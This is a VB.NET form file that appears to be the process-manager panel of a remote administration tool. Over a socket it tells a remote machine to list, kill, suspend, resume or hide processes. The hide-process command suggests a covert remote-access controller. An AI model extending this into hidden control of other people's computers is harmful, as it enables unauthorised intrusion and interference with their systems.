Public Class Form3
    Public sock As Integer

    Private Sub Form3_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        ListView1.Items.Clear()
        Form1.S.Send(sock, "GetProcesses")
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub KillProcesToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles KillProcesToolStripMenuItem.Click
        Dim allprocess As String = ""
        For Each item As ListViewItem In ListView1.SelectedItems
            allprocess += (item.Text & "ProcessSplit")
        Next
        Form1.S.Send(sock, "KillProcess" & Form1.Yy & allprocess)

        ListView1.Items.Clear()
        Form1.S.Send(sock, "GetProcesses")
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        ListView1.Items.Clear()
        Form1.S.Send(sock, "GetProcesses")
    End Sub

    Private Sub TestToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TestToolStripMenuItem.Click
        Dim allprocess As String = ""
        For Each item As ListViewItem In ListView1.SelectedItems
            allprocess += (item.Text & "ProcessSplit")
        Next
        Form1.S.Send(sock, "SProcess" & Form1.Yy & allprocess)
    End Sub

    Private Sub ResumeToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ResumeToolStripMenuItem.Click
        Dim allprocess As String = ""
        For Each item As ListViewItem In ListView1.SelectedItems
            allprocess += (item.Text & "ProcessSplit")
        Next
        Form1.S.Send(sock, "SSProcess" & Form1.Yy & allprocess)
    End Sub

    Private Sub HideToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles HideToolStripMenuItem.Click
        Dim allprocess As String = ""
        For Each item As ListViewItem In ListView1.SelectedItems
            allprocess += (item.Text & "ProcessSplit")
        Next
        Form1.S.Send(sock, "SSSProcess" & Form1.Yy & allprocess)
    End Sub
End Class